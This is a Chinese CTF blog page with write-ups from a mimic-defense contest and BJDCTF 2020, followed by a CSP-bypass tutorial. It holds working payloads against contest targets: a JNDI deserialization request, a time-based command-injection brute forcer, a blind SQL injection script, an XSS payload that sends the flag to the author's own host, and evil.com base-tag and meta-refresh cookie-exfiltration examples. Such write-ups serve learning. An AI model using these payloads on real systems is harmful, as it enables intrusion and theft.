<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-拟态防御记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-06-23T01:27:13.866Z" itemprop="datePublished">2020-06-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p>
<pre><code class="go">package main

import (
    &quot;fmt&quot;
    &quot;io/ioutil&quot;
    &quot;log&quot;
    &quot;net/http&quot;
    &quot;net/url&quot;
    &quot;strings&quot;
)

var (
    secret   = &quot;xiaomo.wabzsy&quot;
    banner   = &quot;Golang HTTP Server (v2.3.3)&quot;
    template = `&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;San Check&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;form method=&quot;POST&quot;&gt;
            &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;
            &lt;input type=&quot;submit&quot; value=&quot;淦!&quot; /&gt;
        &lt;/form&gt;
        &lt;pre&gt;
%s
        &lt;/pre&gt;
    &lt;/body&gt;
    &lt;!-- ./sancheck.php --&gt;
&lt;/html&gt;`
)

func SanCheck(input string) error {
    u, err := url.Parse(input)

    if err != nil {
        return err
    }

    if u.Scheme != &quot;http&quot; {
        return fmt.Errorf(&quot;err: Invalid Scheme [%s]&quot;, u.Scheme)
    }

    if u.Opaque != &quot;&quot; {
        return fmt.Errorf(&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;, u.Opaque)
    }

    if u.Hostname() != &quot;127.0.0.1&quot; {
        return fmt.Errorf(&quot;err: Invalid Hostname [%s]&quot;, u.Hostname())
    }

    if u.Port() != &quot;&quot; &amp;&amp; u.Port() != &quot;80&quot; {
        return fmt.Errorf(&quot;err: Invalid Port [%s]&quot;, u.Port())
    }

    if u.User == nil {
        return fmt.Errorf(&quot;err: Authorization Required&quot;)
    }

    if u.User.Username() != &quot;root&quot; {
        return fmt.Errorf(&quot;err: Invalid Username [%s]&quot;, u.User.Username())
    }

    if password, set := u.User.Password(); !set || password != &quot;P@ssw0rd!&quot; {
        return fmt.Errorf(&quot;err: Invalid Password [%s]&quot;, password)
    }

    if u.RequestURI() != &quot;/flag.php&quot; {
        return fmt.Errorf(&quot;err: Invalid RequestURI [%s]&quot;, u.RequestURI())
    }

    if u.Fragment != &quot;&quot; {
        return fmt.Errorf(&quot;err: Invalid Fragment [%s]&quot;, u.Fragment)
    }

    if !strings.Contains(u.String(), &quot;&#39;Pwned!&#39;&quot;) {
        return fmt.Errorf(&quot;err: San Check failed&quot;)
    }

    return nil
}

func DefaultHandler(w http.ResponseWriter, req *http.Request) {

    input := req.PostFormValue(&quot;url&quot;)

    if input == &quot;&quot; {
        Response(w, template, &quot;Where is the flag?&quot;)
        return
    }

    if err := SanCheck(input); err == nil {
        req, _ := http.NewRequest(&quot;GET&quot;, input, nil)
        req.Header.Add(&quot;Secret&quot;, secret)
        if resp, err := (&amp;http.Client{}).Do(req); err == nil {
            if body, err := ioutil.ReadAll(resp.Body); err == nil {
                Response(w, template, string(body))
            }
            _ = resp.Body.Close()
        } else {
            Response(w, template, err.Error())
        }
    } else {
        Response(w, template, err.Error())
    }
}

func FlagHandler(w http.ResponseWriter, req *http.Request) {
    if strings.Join(req.Header[&quot;Secret&quot;], &quot;&quot;) != secret {
        Forbidden(w)
    } else if !strings.HasPrefix(req.RemoteAddr, &quot;127.0.0.1&quot;) {
        Forbidden(w)
    } else {
        Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, readFlag())
    }
}

func readFlag() string {
    if bs, err := ioutil.ReadFile(&quot;./flag.txt&quot;); err == nil {
        return string(bs)
    } else {
        return fmt.Sprintf(&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;, err.Error())
    }
}

func CodeHandler(w http.ResponseWriter, _ *http.Request) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if bs, err := ioutil.ReadFile(&quot;main.go&quot;); err == nil {
        _, _ = w.Write(bs)
    } else {
        _, _ = w.Write(
            []byte(
                fmt.Sprintf(&quot;Unable to read main.go, please contact technical support.(%s)&quot;,
                    err.Error(),
                ),
            ),
        )
    }
}

func Forbidden(w http.ResponseWriter) {
    w.WriteHeader(403)
    Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, &quot;403 Forbidden&quot;)
}

func Response(w http.ResponseWriter, tpl string, response string) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if _, err := fmt.Fprintf(w, tpl, response); err != nil {
        log.Println(err)
    }
}

func main() {
    http.HandleFunc(&quot;/&quot;, DefaultHandler)
    http.HandleFunc(&quot;/flag.php&quot;, FlagHandler)
    http.HandleFunc(&quot;/sancheck.php&quot;, CodeHandler)
    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))
}</code></pre>
<p>根据issue<a href="https://github.com/golang/go/issues/29098" target="_blank" rel="noopener">https://github.com/golang/go/issues/29098</a> 绕过</p>
<p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:ccreater@163.com">ccreater@163.com</a>  E6N0HT aa05940594</p>
<p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p>
<h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><pre><code>vtysh
conf t
ip route 200.14.1.0/24 x.x.x.x</code></pre><h2 id="白盒拟态域名服务器"><a href="#白盒拟态域名服务器" class="headerlink" title="白盒拟态域名服务器"></a>白盒拟态域名服务器</h2><p>上传busybox 来使用nslookup等命令</p>
<pre><code>cat /etc/name.conf
根据配置修改
sudo /usr/local/bind-9.11.19/bin/named/named
busybox nslookup www.test.com 172.29.126.2 看结果</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/06/23/拟态防御记录/">http://blog.ccreater.top/2020/06/23/拟态防御记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="ckbr91buj0000d0v08mwg1evw" data-title="拟态防御记录" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020第三届BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" class="article-date">
  <time class="dt-published" datetime="2020-05-23T16:40:57.277Z" itemprop="datePublished">2020-05-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020BJDCTF第三届"><a href="#2020BJDCTF第三届" class="headerlink" title="2020BJDCTF第三届"></a>2020BJDCTF第三届</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><pre><code class="php"># -*-coding:utf-8 -*-
import requests
import re

flag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)
all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;


def get_flag(command):
    try:
        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)
    except:
        return True
    return False


if __name__ == &#39;__main__&#39;:
    flag = &#39;BJD{make_iptables_great_again}&#39;
    while flag_format.match(flag) == None:
        staus = 0
        for i in all_letter:
            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)
            print(payload)
            if get_flag(payload):
                staus = 1
                flag += i
                print(flag)
                break
        if staus == 0:
            flag = flag[0:-1]
</code></pre>
<h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p>
<p>可能存在反序列化</p>
<p>和文件内容无关</p>
<p>上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取</p>
<p>当唯一麻烦的是，文件名后面有个md5校验值</p>
<p>但是当我们直接上传的时候她会生成一个，哪怕没上传成功</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p>
<p>直接拿来用访问show.php就拿到flag了</p>
<h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p>
<p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p>
<p>黑名单:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p>
<p>给了个hint:<code>table</code>,不知道啥意思</p>
<pre><code class="python">
import requests
import time
import string


def sqlinj(num):

    burp0_url = &quot;http://183.129.189.60:10117/&quot;
    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)
    time.sleep(0.5)
    print(param)
    if &quot;/static/img/dundundun.gif&quot; in r.text:
        print(&quot;filter &quot;,param)
        exit()
    if &quot;y1ng&quot; in r.text:

        return False
    else :
        return True




#database: ms
#mysql,sys
#Hint: /Source Password
#table:gtid_executed,sys_config
result=&quot;12,Hint: /Source Password: T1Me&quot;
pos=len(result)*2+2

while True:
    flag=False
    for i in string.printable:
        if sqlinj(ord(i)):
            result+=i
            print(&quot;Found:&quot;+result)
            flag=True
            break
        print(&quot;result:&quot;+result)
    pos+=2
    if flag is False:
        break</code></pre>
<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>flag.php</p>
<pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG
    echo FLAG;
else echo $_SERVER[&#39;REMOTE_ADDR&#39;];
</code></pre>
<p>bot脚本：</p>
<pre><code class="php">
if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check
    $url = $_POST[&#39;url&#39;];
    $captcha = $_POST[&#39;captcha&#39;];
    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {
        //admin checking, it will take several seconds

    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);
}
?&gt;</code></pre>
<pre><code class="php">function checkURL($url) {
    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )
        return false;
    else return true;
}
function checkNote($s) {
    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;
    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;
    else return true;
}</code></pre>
<p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p>
<p>绕过</p>
<pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();
xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre>
<p>拿到flag</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p>
<pre><code>/flag.php
/index.php
/log.php
/login.php
/www.zip</code></pre><p>flag.php</p>
<pre><code class="php">flag.php关键代码如下：
$classname = $_GET[&#39;classname&#39;];
$data = $_GET[&#39;data&#39;];
$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);
Only users from the website can request this page. flag in /flag, have fun!</code></pre>
<p>先登陆康康,需要key,相关代码在:</p>
<pre><code class="php">&lt;?php
    header(&quot;content-type:text/html;charset=utf-8&quot;);
    session_start();
    function getkey()
    {
        $key = &#39;&#39;;
        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);
        for ($i = 0; $i &lt; 48; $i++)
        {
            $key = $key . $chars[random_int(0, 61)];
        }
        $_SESSION[&#39;key&#39;] = $key;
        return $key;
    }
    function getreferer() {
        static $referer;
        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {
                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];
            }
        elseif(isset($_POST[&#39;URL_REFERER&#39;])){
                $referer = $_POST[&#39;URL_REFERER&#39;];
            }
        else{
            die(&quot;Where are you from?&quot;);
        }
        return $referer;
    }
        $key = getkey();
        $url = getreferer();
        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){
            die(&quot;What do you want to do?&quot;);
        }
        $host = parse_url($url, PHP_URL_HOST);
        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){
            $headers = get_headers($url,1);
            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){
                echo $key;
            }
            else{
                echo &#39;dd beheading!&#39;;
            }
        }
        else{
            die(&quot;Only dd working at Google can get the key!&quot;);
        }</code></pre>
<h2 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p>
<p>User.php</p>
<pre><code class="php">&lt;?php
if ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)
    highlight_file(__FILE__);

/**
 * @Entity
 * @Table(name=&quot;user&quot;)
 */
class User
{
    /** 
     * @Id
     * @Column(type=&quot;integer&quot;)
     * @GeneratedValue
     */
    protected $uid;
    /** 
     * @Column(type=&quot;string&quot;) 
     * @unique
     */
    protected $username;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $password;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $role;

    public function __get($name)
    {
        if (property_exists(__CLASS__, $name)) {
            return $this-&gt;$name;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
    public function __set($name, $value)
    {
        if (property_exists(__CLASS__, $name)) {
            $this-&gt;$name = $value;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
}</code></pre>
<h2 id="布吉岛"><a href="#布吉岛" class="headerlink" title="布吉岛"></a>布吉岛</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p>
<p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/24/2020第三届BJDCTF/">http://blog.ccreater.top/2020/05/24/2020第三届BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="ckajv0tk5000008v0gudf486r" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/20/bypass_csp/" class="article-date">
  <time class="dt-published" datetime="2020-05-20T14:05:20.880Z" itemprop="datePublished">2020-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/20/bypass_csp/">bypass_csp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noopener">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p>
<h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p>
<p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> )</p>
<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
<p>script-src 中 strict-dynamic 中的作用:</p>
<ul>
<li>丢弃白名单</li>
<li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li>
<li>使  nonce-only CSPs  可以工作</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
<h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code>Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
<p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p>
<p>假设static目录下存在一个302文件</p>
<pre><code>Static/302.php

&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</code></pre><p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p>
<pre><code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</code></pre><h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5预加载)(only chrome)
&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; （DNS预加载）
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;http://lorexxar.cn?c=[cookie]&quot;&gt;</code></pre>
<h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p>
<p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p>
<pre><code class="html">&lt;head&gt;
  &lt;base href=&quot;https://www.evil.com/&quot; target=&quot;_blank&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;img src=&quot;images/stickman.gif&quot; width=&quot;24&quot; height=&quot;39&quot; alt=&quot;Stickman&quot;&gt;&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;
&lt;a href=&quot;tags/tag_base.asp&quot;&gt;HTML base Tag&lt;/a&gt;
&lt;/body&gt;&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</code></pre>
<p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p>
<pre><code class="html">&lt;!-- XSS --&gt;
&lt;base href=&quot;https://evil.com/&quot;&gt;
&lt;!-- End XSS --&gt;
…
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p><a href="https://evil.com/foo/bar.js" target="_blank" rel="noopener">https://evil.com/foo/bar.js</a></p>
<pre><code>alert(0000);</code></pre><p>成功执行</p>
<p>防御方式：</p>
<p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p>
<h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><pre><code class="html">&lt;!-- XSS --&gt;
&lt;svg&gt;&lt;set href=&quot;victim&quot; attributeName=&quot;href&quot; to=&quot;data:,alert(1)&quot; /&gt;
&lt;!-- End XSS --&gt;
…
&lt;script id=&quot;victim&quot; src=&quot;foo.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>SVG中的set标签可以修改其他标签的属性值</p>
<p>该漏洞在chrome58中修复</p>
